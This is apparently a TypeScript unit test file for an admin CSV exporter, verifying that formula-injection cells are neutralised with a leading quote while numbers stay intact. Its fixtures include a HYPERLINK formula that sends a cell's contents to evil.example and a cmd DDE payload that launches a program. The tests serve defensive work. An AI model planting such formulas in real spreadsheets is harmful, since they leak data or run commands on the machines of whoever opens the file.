/// <reference types="node" />

// Admin CSV export (admin/src/lib/csv.ts): formula injection is neutralized (SEC-09) while
// numbers and amounts stay numbers. Run with `npm run test:unit`.

import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import { csvAmount, csvCell, toCsv } from '../../admin/src/lib/csv.ts';

describe('csvCell: formula-looking text gets a leading quote (SEC-09)', () => {
  it('=HYPERLINK(...) is exported as text', () => {
    assert.equal(
      csvCell('=HYPERLINK("http://evil.example/?x="&A1,"Pedro")'),
      `"'=HYPERLINK(""http://evil.example/?x=""&A1,""Pedro"")"`,
    );
  });

  it('+, - and @ starts are prefixed', () => {
    assert.equal(csvCell('+1+1'), "'+1+1");
    assert.equal(csvCell('-2'), "'-2");
    assert.equal(csvCell('@SUM(A1:A9)'), "'@SUM(A1:A9)");
    assert.equal(csvCell("=cmd|' /C calc'!A0"), "'=cmd|' /C calc'!A0");
  });

  it('tab and carriage-return starts are prefixed (and quoted for the line break)', () => {
    assert.equal(csvCell('\t=1+1'), "'\t=1+1");
    assert.equal(csvCell('\r=1+1'), `"'\r=1+1"`);
  });

  it('normal text is unchanged', () => {
    assert.equal(csvCell('Juan Dela Cruz'), 'Juan Dela Cruz');
    assert.equal(csvCell('María Santos-Reyes'), 'María Santos-Reyes');
    assert.equal(csvCell('1234567890123'), '1234567890123');
    assert.equal(csvCell('2026-11-19T08:00:00.000Z'), '2026-11-19T08:00:00.000Z');
    assert.equal(csvCell(''), '');
  });

  it('a formula character later in the text is left alone', () => {
    assert.equal(csvCell('Paid 2+1 trips'), 'Paid 2+1 trips');
    assert.equal(csvCell('name@example.com'), 'name@example.com');
  });

  it('commas, quotes and line breaks are still quoted', () => {
    assert.equal(csvCell('Cruz, Juan'), '"Cruz, Juan"');
    assert.equal(csvCell('say "hi"'), '"say ""hi"""');
    assert.equal(csvCell('line 1\nline 2'), '"line 1\nline 2"');
  });
});

describe('numbers and amounts stay numbers', () => {
  it('plain numbers, including negatives, are unchanged', () => {
    assert.equal(csvCell(12), '12');
    assert.equal(csvCell(-2), '-2');
    assert.equal(csvCell(0), '0');
  });

  it('csvAmount writes fixed decimals without a prefix', () => {
    assert.equal(csvCell(csvAmount(700.5)), '700.50');
    assert.equal(csvCell(csvAmount(-12)), '-12.00');
    assert.equal(csvCell(csvAmount(0)), '0.00');
    assert.equal(csvCell(csvAmount(1234.567)), '1234.57');
  });
});

describe('toCsv', () => {
  it('BOM, CRLF line ends, mixed cells', () => {
    const csv = toCsv([
      ['Driver', 'Amount (PHP)', 'Trips'],
      ['=HYPERLINK("x")', csvAmount(-50), 3],
      ['Juan', csvAmount(700.5), 0],
    ]);
    assert.equal(csv, `﻿Driver,Amount (PHP),Trips\r\n"'=HYPERLINK(""x"")",-50.00,3\r\nJuan,700.50,0\r\n`);
  });
});
